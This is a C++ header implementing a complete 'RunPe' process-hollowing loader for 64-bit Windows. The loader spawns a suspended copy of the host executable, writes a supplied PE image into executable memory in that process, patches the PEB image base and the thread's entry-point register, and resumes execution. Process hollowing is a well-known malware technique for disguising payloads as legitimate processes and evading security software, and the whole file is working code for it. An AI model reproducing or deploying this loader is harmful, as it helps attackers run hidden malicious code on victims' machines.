#pragma once
#include <Windows.h>
#include <iostream>
#include <exception>
BOOL RunPe(void* bytes)
{
	//PE headers
	IMAGE_DOS_HEADER* Dos_Header;
	IMAGE_NT_HEADERS64* NT_Header;
	IMAGE_SECTION_HEADER* Section_Header;

	//Process Creations
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_info;
	char CurrentPath[MAX_PATH];


	// memory + context
	CONTEXT Context;
	DWORD64 Imagebase;
	void* pImagebase = nullptr;


	// intialize the headers
	Dos_Header = reinterpret_cast<IMAGE_DOS_HEADER*>(bytes);
	NT_Header = reinterpret_cast<IMAGE_NT_HEADERS64*>((DWORD64)bytes + Dos_Header->e_lfanew);


	if (NT_Header->Signature != IMAGE_NT_SIGNATURE)
		throw std::runtime_error("NT Header didnt intialize correctly");

	if (NT_Header->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		throw std::runtime_error("PE must be 64bit to run!");

	// set the corrent path location to create the process.
	GetModuleFileNameA(0, CurrentPath, MAX_PATH);

	ZeroMemory(&process_info, sizeof(process_info)); //initialize the process_info memory to 0
	ZeroMemory(&startup_info, sizeof(startup_info)); //initialize the startup_info memory to 0
	startup_info.cb = sizeof(startup_info); // set the size of the startup_info (startup info) in the cb member.

	if (!CreateProcessA(CurrentPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup_info, &process_info))
		throw std::runtime_error("PE process creation failed!");

	// request for full context means all the registery when getting thread context
	Context.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(process_info.hThread, &Context))
		throw std::runtime_error("Get Thread Context failed!");

	//read the original imagebase from PEB (Process Environment Block) and put it on imagebase var. (CTX.Rdx + 16) point to the imagebase in the PEB
	if (!ReadProcessMemory(process_info.hProcess, reinterpret_cast<LPCVOID>(Context.Rdx + 16), &Imagebase, sizeof(Imagebase), NULL))
		throw std::runtime_error("Read main process memory failed!");

	// allocate the PE memory size on the new process creation.
	pImagebase = VirtualAllocEx(process_info.hProcess, reinterpret_cast<LPVOID>(NT_Header->OptionalHeader.ImageBase), NT_Header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pImagebase == nullptr)
		throw std::runtime_error("allocate memory failed!");

	// write the PE memory in the parent process. (write all the headers)
	if (!WriteProcessMemory(process_info.hProcess, pImagebase, bytes, NT_Header->OptionalHeader.SizeOfHeaders, NULL))
		throw std::runtime_error("Failed to write PE memory!");

	for (int i = 0; i < NT_Header->FileHeader.NumberOfSections; ++i)
	{
		// intialize the Section_Header for each section in the loop
		Section_Header = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<DWORD64>(bytes) + Dos_Header->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));

		// write the section start from their vitrual address. (imagebase + vitrual addr)
		if (!WriteProcessMemory(process_info.hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(pImagebase) + Section_Header->VirtualAddress), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(bytes) + Section_Header->PointerToRawData), Section_Header->SizeOfRawData, NULL))
			throw std::runtime_error("Failed to write section memory");

	}

	// modify the imagebase in the PEB to point to the new imagebase of the new PE
	if (!WriteProcessMemory(process_info.hProcess, (LPVOID)(Context.Rdx + 16), &NT_Header->OptionalHeader.ImageBase, sizeof(NT_Header->OptionalHeader.ImageBase), NULL))
		throw std::runtime_error("Failed to write the imagebase in memory");

	// set the entrypoint in the RCX registery.
	Context.Rcx = reinterpret_cast<DWORD64>(pImagebase) + NT_Header->OptionalHeader.AddressOfEntryPoint;

	// update the thread content with the new entry point
	SetThreadContext(process_info.hThread, &Context);

	//resume the thread from suspended mode.
	ResumeThread(process_info.hThread);

	// close the handles
	CloseHandle(process_info.hThread);
	CloseHandle(process_info.hProcess);

	// return true if everything made in succesfully.
	return true;

}